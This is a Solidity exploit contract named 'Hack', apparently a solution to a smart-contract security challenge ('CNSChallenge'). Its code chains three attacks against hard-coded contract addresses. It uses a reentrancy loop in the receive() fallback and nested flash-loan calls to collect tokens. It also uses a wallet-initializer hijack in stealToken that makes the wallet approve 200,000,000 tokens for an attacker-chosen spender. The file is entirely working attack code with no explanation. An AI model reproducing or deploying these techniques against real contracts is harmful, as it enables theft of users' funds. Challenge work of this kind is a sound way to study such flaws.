// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./CNSChallenge.sol";
import "./CNSWallet.sol";
import "./CNSToken.sol";

// -> web3.eth
contract Hack is IFlashLoanReceiver {

    CNSChallenge public cnsChallenge;
    CNSToken public cnsToken;
    CNSWallet public cnsWallet;

    bytes public initializer;
    bytes public attackInitializer;
    bytes public approveInitializer;

    uint16 public next;
    uint counter = 0;
    uint256 public totalAmount = 0;

    constructor(uint16 initNext) {
        next = initNext;
        cnsChallenge = CNSChallenge(0xc7e1A176060e0A92148845dae55F5614cDcE3Ca4);
        cnsWallet = CNSWallet(0xfDa3E9Aab0bf395E176BFd56f04b09E9D6Fdf3Ff);
        cnsToken = CNSToken(0x9a125190981b318C9c855303978530D2c32487d2);
    }

    // fallback function
    receive() external payable {
        if (counter < 2) {
            counter += 1;
            cnsChallenge.reentry("b08505045");
        }
    }

    // get random number
    function random() public {
        next = next * 8191 + 12347;
    }

    function ReentryAttack() external {
        require (counter == 0);
        counter += 1;
        cnsChallenge.reentry("b08505045");
    }
    
    function execute(
        address tokenAddr,  // cnsToken
        address lender,     // CNSChallenge
        uint256 amount      
    ) public override returns (bool){
        totalAmount += amount;
        if (cnsChallenge.flashloaning() != 0) {
            cnsChallenge.flashloan(1);
        }
        else {
            cnsChallenge.giveMeToken("b08505045");
        }
        cnsChallenge.cnsToken().approve(lender, totalAmount);
        return true;
    }

    function getToken() public {
        cnsChallenge.flashloan(10000);
    }

    // 
    function stealToken(address _to, address spender) public {
        // approveInitializer = abi.encodeWithSignature("approve(address,uint256)", _to, 200000000);
        attackInitializer = abi.encodeWithSignature("attack(address,address)", _to, spender);
        cnsWallet.setup(new address[](0), 0, address(this), attackInitializer);
    }

    function attack(address _to, address spender) external {
        (bool success, ) = _to.call(abi.encodeWithSignature("approve(address,uint256)", spender, 200000000));
        require(success, "call failed");
    }
}